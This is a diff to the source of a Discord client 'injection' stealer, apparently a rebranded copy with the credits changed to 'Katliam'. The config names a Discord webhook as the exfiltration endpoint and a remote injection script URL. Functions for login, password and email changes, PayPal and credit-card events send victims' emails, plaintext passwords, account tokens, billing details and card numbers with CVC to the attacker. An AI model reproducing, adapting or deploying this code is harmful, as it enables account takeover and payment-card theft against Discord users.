@@ -6,13 +6,13 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1073703313289261186/3fweZmKXw9LVTVEW6Y6oLyxMJV7H6BVpivl-aMhPyvg55mgAyme92mfFWz-2oSB-WYpS', 
-  webhook_protector_key: 'https://discord.com/api/webhooks/1073703313289261186/3fweZmKXw9LVTVEW6Y6oLyxMJV7H6BVpivl-aMhPyvg55mgAyme92mfFWz-2oSB-WYpS', 
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'Katliam', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1073703290577105048/1085638594590425098/pedro-pascal-1.jpg?size=4096'.replace(/ /g, '%20'), 
+  ping_val: '@here',
+  embed_name: 'Katliam19', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Eathemcmd/ahmetkaya/main/index.js', 
   /**
@@ -660,17 +660,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Account Information**',
+            value: `<:mail:1069997090266173500> Email: **${email}** - <:blacklock:1069101792736051221> Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -680,7 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'Katliam',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
@@ -703,16 +704,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `<:mail:1069997090266173500> Email: **${json.email}**\n<:blacklock:1069101792736051221> Old Password: **${oldpassword}**\n<:blacklock:1069101792736051221> New Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -722,7 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'katliam',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
@@ -745,16 +747,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `<:mail:1069997090266173500> New Email: **${email}**\n<:blacklock:1069101792736051221> Password: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -764,7 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'Katliam',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
@@ -791,12 +794,12 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -806,7 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'Katliam',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
@@ -833,12 +837,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -848,7 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'Katliam',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
@@ -877,12 +882,12 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1069103325200535694> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -892,7 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+            text: 'Katliam19',
+            icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
         },
       },
     ],
